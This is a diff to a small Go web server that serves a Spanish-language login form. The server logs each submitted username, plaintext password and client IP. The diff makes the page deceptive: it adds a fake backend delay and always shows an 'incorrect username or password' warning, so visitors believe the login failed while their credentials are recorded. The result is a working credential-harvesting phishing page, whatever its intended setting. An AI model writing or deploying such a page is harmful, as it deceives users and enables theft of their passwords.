@@ -6,6 +6,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"time"
 )
 
 var tpl = template.Must(template.New("login").Parse(`
@@ -49,12 +50,27 @@ var tpl = template.Must(template.New("login").Parse(`
             font-size: 15px;
             cursor: pointer;
         }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <div class="box">
         <form method="POST">
             <h2 style="text-align:center">Login</h2>
+            {{if .ShowWarning}}
+            <div class="warning">
+                ⚠️ Usuario o contraseña incorrectos
+            </div>
+            {{end}}
             <input type="text" name="username" placeholder="Usuario" required />
             <input type="password" name="password" placeholder="Contraseña" required />
             <button type="submit">Entrar</button>
@@ -74,12 +90,17 @@ func getIP(r *http.Request) string {
 
 func loginHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
+		// Simular delay de llamada al backend
+		time.Sleep(800 * time.Millisecond)
+		
 		user := r.FormValue("username")
 		pass := r.FormValue("password")
 		ip := getIP(r)
 
 		log.Printf("LOGIN --> user='%s' password='%s' ip='%s'\n", user, pass, ip)
-		w.Write([]byte("<h3>Datos recibidos. Revisa los logs del contenedor.</h3>"))
+		
+		// Mostrar warning de credenciales incorrectas
+		tpl.Execute(w, map[string]bool{"ShowWarning": true})
 		return
 	}
 	tpl.Execute(w, nil)
